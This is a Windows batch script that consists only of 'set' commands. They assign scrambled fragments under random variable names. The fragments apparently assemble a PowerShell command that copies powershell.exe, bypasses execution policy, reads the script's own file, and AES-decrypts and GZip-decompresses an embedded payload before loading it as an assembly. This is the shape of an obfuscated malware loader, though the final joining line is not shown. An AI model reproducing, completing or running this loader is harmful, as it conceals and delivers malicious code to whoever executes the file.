@echo off
set "KDNltZeIbk=0\"
set "VfDxwAdwtB=do"
set "RjPojkMsmx=Sy"
set "uPcgUqSPsS=ll"
set "UdVibaAUPV=rS"
set "lbXxMBxixg=Po"
set "pcZFIcgTpH=ws"
set "eNPhRZvAdc=:\"
set "OkwqkRslBP= /"
set "exNkxdLsZy=he"
set "XnUCWYzoJr=\W"
set "wvpRvdRHwR=py"
set "bYGvWibZUw=32"
set "irXJpVjwIo=Wi"
set "sJNTNigOvM=\v"
set "HurvgPVBAN=rs"
set "LMfSOYpRpM=co"
set "wqmujaGxDl= C"
set "vyrwBSJxgw=we"
set "wHTvDUFvTN=.e"
set "dVYmgRLCdQ=ll"
set "IrEuIftCen=s\"
set "czAyXPNDIx=in"
set "yKRpKrcTcG=st"
set "qbwmGLpGOP=em"
set "dFUzZqFAAP=xe"
set "IToamTigKU=he"
set "cTbxUuALJN=nd"
set "pXRZCZgund=po"
set "XgiHrwEsHC=y "
set "sRodHJFhav=ow"
set "bCsCxBkqkH=1."
set "NtLXTADwPF=we"
set "yqlEAaFPON=cd"
set "rWZkgRKcqJ= %~dp0"
set "fPXwxZXLgO='txe"
set "wbYvaAHOmM=::De"
set "OaybWFPESl=rans"
set "MzuCEVnnqL=;$zU"
set "UJuXMPnOMm=);$L"
set "ZsFJVQGdiJ=and "
set "DxzmEuofDw=[]] "
set "MkWdlfHdEf=v4Ir"
set "AuMOWSZdwd=Secu"
set "RKYpifkCKH=g = "
set "uNBjJoRHrz=TllA"
set "fklaIujSuL=p, 0"
set "EjYGnnBzFp=ress"
set "NKDTAlVDTz=HzNu"
set "DVwguUaLKx=ypto"
set "KhoOPxOHOC=join"
set "JFmRQGlDUp=-1.."
set "CLfHkrfKKp=FDIg"
set "ROMqXyxIKA=-Obj"
set "ZvfCVSRKzQ=xp ="
set "ummOejYfAU=wM.D"
set "vWUOBKDVZD=DIgA"
set "BaREJeqlWh=p = "
set "SXoUSAaggA=tem."
set "PlEGvwdmtR=m.Re"
set "DhJDRnhuNI=DIgA"
set "eoOAcqvxfF=-nop"
set "jLGlEWwBLT=lzxp"
set "ucNXHhoPWB=oryS"
set "qAYlZUvdxI=.Cry"
set "dCdjsAMhzO=null"
set "vbHsWuYFYF=em.C"
set "oGeRFgYLzH=tion"
set "iuViwULBaA=New-"
set "jXpcFRidzD=$Gle"
set "GxgxsXwqHK=();$"
set "biegcrCmzT=.Dis"
set "eYShdfJbLr=.Mem"
set "fYMgzzlhnZ=Bmor"
set "xYCcFtiygQ=('%~f0'"
set "rAfOydFFCZ=.Ass"
set "ZxxwhNUXgy=raph"
set "byjuufVOMQ=in $"
set "pQbssqBEbf=ptog"
set "ZYDDbCoVDT=);$x"
set "uYXRkObfzr=m.IO"
set "GkUTovezll=Syst"
set "WSEnAEqYbN=-4] "
set "TPFKWHTIDo=y.Cr"
set "nKUTTskakc=$Flz"
set "EnqDtNQrqt=ionM"
set "QCDulEgjiu=grap"
set "ClEztCnFDq=lBlo"
set "VhQeGUlTKX=Disp"
set "uJTkdoMVfv=to ="
set "uQfcGOqxKp=ect "
set "gKXacGLjcP='')("
set "OwnjwqRVdw=6] -"
set "hAtYElxshn=rofi"
set "AqDFhJLLkR=, (,"
set "RQesDuDawL=;$zU"
set "jBjZnpbSRo=);$F"
set "BcLYAJnuuR=ddin"
set "EjaCfwoSOB=lit("
set "WcFtgZBpUA=stem"
set "vzMmcrjGHH=);$U"
set "ZwSFCuVahu=[Env"
set "XkcWIUIMkT=sGUc"
set "dHiuIZwWXB=ateD"
set "KRKKfxIGYK=ke($"
set "fcfDGFttsi=imwM"
set "mWRtCeFjIC=..-1"
set "zYIJOpeuyb= = $"
set "IwsYEfwUmJ=ximw"
set "rOYRkMBFLl=.Len"
set "sunYKUTKVb=pose"
set "ZACGbXGCym=();$"
set "rAAJWYKrWw=k; }"
set "zljYyVIWRD=xp);"
set "iIMuENeSYQ=esFX"
set "AvJhQqVbAD=vj0m"
set "sURtdGyMxe=bypa"
set "ahJMBpNApk='[-1"
set "PNOimQakuw=tem."
set "yLRerAIaEw=saBm"
set "xuchXdIYwl=Bxpr"
set "sFDwBRwPLl=Nuh."
set "cdcDLHXyZa=e]::"
set "yboefTihPN= [Sy"
set "XitmqonPwR=gth)"
set "vcIuXnNfat=.Dis"
set "CPDjkIFNTm=ing("
set "ckJqJIZIWG=..-1"
set "mmkuHrllzr=nage"
set "dLpSyjKWtp=Secu"
set "qXvgbWrAAc=7Yiv"
set "ckTkXEIIsU=$ovm"
set "guoHTRtdoT=e = "
set "aVAazWAceA=16] "
set "pbcmlQTzsm=::('"
set "KvNggNXsXG=('l0"
set "WxhXjDNdSE=y.Pa"
set "ysNMAbcrrz=('da"
set "kLSSNyJMXe=oArr"
set "MOAFMTLMaH=($Hz"
set "ouRUmxHzIt=daeR"
set "mmzPemvanO=QNus"
set "uwLtQwJKxz=.-16"
set "tCLfjxptuT=pDZz"
set "vHUOiFcVgO=gnir"
set "WqqPkOaQub=ach "
set "XAVhIhfNvN= = ["
set "GvvFAGTTcC=mory"
set "eevjDimFKP=ptog"
set "NuataDmiyW=isfL"
set "uLdagGdzAc=xpr."
set "hELRQSbaZz=Flzx"
set "oMaCvPgWbB=DIgA"
set "XxAdoNpDpM=F'[-"
set "HURUMlWnmu=Conv"
set "vVYpiYEXtp=7;$F"
set "LEFMPlvUAx=ew-O"
set "ZQspVPKMbH=Fo7l"
set "OGzLkbAWtL=ddin"
set "QKpBTihMbo=y]::"
set "gyHLUssGoP=t Sy"
set "WPYNanXaWi=ment"
set "fWfXTYEDZj=rity"
set "xQMZnkhDKh=ct S"
set "ojmXwaqduq== [S"
set "XMGuFgaNXh=ck($"
set "QxypliEnTq=Sa.T"
set "CzuazhFTAH=n ''"
set "awlmFRCpWd=eyC."
set "AKAjzxXnoc=d;$F"
set "UrBmlRCfGx=Vf.T"
set "ebWsrCkMhE=.Key"
set "pzGKzScKMA=6esa"
set "ASzNqIYEOP=em.I"
set "sycMOmePIt=join"
set "klCuWDfazW='[-1"
set "VniDZUVRrC=rtS4"
set "OnAheWCEib=h.Su"
set "rHBwXCgXtC=DIgA"
set "CFUKrsGpGK=ion."
set "eLXMkaVPfe=File"
set "IODsERZDvL=-joi"
set "dpmGygjRWT=tsWi"
set "wVdZpOWcag=fore"
set "EXNugnXUSx=urit"
set "FIKDNNliSz=pher"
set "FNrNoeEWqD=form"
set "UXApADFmrX=lzxp"
set "ifbtkjUudj=bstr"
set "TFSpPPOvHa=$FDI"
set "NPsYWUzcRB=C = "
set "PLJUEZxspP=am;$"
set "VHQfxwQdxM=tryP"
set "fIWtegHBoi=th('"
set "AUQTZJZiwJ=[Sys"
set "vcJirbsuVp=Disp"
set "FOiDkvAoZH=Comp"
set "mGGYBFvkua= [Sy"
set "hUfZJgSisV=.GZi"
set "XzkRAmhJiJ=ert]"
set "dwCSlebKmo=orF'"
set "epJFRVSKMy=]::N"
set "wlEWEkyfFo=ne);"
set "IVDgoHVsru=;$Gl"
set "XJkOYfRLcC=pStr"
set "ibetczLDUk=m(, "
set "dBbrrBevZI=$LBt"
set "bQmoRLKDZy=ZYYc"
set "mzasehNmwu=se()"
set "DfHFYcXzDr=)($S"
set "rwUaYqFvIU=morF"
set "wMIfmmemkm=ose("
set "oMdyFdCOnt== $F"
set "QYsZGWIvto=, $F"
set "VwbZBBFyef=New-"
set "QkQoHnBjBJ=yste"
set "trtvPWYDuS=3); "
set "zWOPUXTiRS=$xim"
set "iAPPaljrrJ=nirt"
set "xNfycNdPSE=Nuh "
set "TigwEZBLgO=Sa);"
set "ayhpGWPLvV=]::("
set "fiYGpdsWXv=)) {"
set "tUUMAmCpry=m.IO"
set "NqeJimMSrQ=pose"
set "LpxjLotiIb=3HWs"
set "RPuZLUVLgx=:: '"
set "SjqVqzSVPz=trea"
set "LnsXYZAUzK=[Sys"
set "nmiPjVSDko=:('g"
set "qjatxVKibQ=.Con"
set "MOKigsxEkw=comp"
set "IhOisYBjAq=ewLi"
set "nOmlisXuUh=$LBt"
set "gmxWbwCPcU=.Sec"
set "SsKNfBAzBs=);$F"
set "YHgBucaBOT=BVf."
set "XxAQZXFCUz=ring"
set "FWbSsSmLSY=UGTu"
set "iHtzTQbMsN=ispo"
set "xDKXqXLFkn=yste"
set "UzZdzpZFWm= = N"
set "cZfJEyoYEr=Syst"
set "ujNgbZXHVb=PKCS"
set "BxXkaFLcRB=bjec"
set "ufhcSIIkIr=brea"
set "OHZlFKXcka=1] -"
set "AghAeYxRfN=736u"
set "ztmQQdPMGk=)))"
set "tKcHLathjg=Comp"
set "EQAmAfVmOT=rt]:"
set "CjMUFaYZYJ=] -j"
set "TqDTUyrVol=y.Ci"
set "NCsNLSuNVq==');"
set "pPXionEwQi=+hAO"
set "vvWlBkCsCW=sion"
set "eFIRbPadoS=iron"
set "avhXoaBCbW=tem."
set "kHKDCIvymw=ovmt"
set "qPKWIRLGEo=; };"
set "QpjUYZmixT=]::C"
set "rcYgyFFREy=ress"
set "lNQKEGRClB=ss -"
set "oSymyDjvjt=OyzA"
set "CTmOqJAHal=esMa"
set "LGMCDyMHgm=O.Me"
set "zNrtihwWGL=.Cre"
set "jBDnTWFyUU=Obje"
set "szsWAmmeMx=-ep "
set "ccdQzLmqtS=.Cry"
set "EyqsyBfzAt=BtSa"
set "bpaWpjseFX=BVf "
set "krZkPwIBqC=$Flz"
set "LYTjEUhRid=gMod"
set "gDWKILkhmv=yC, "
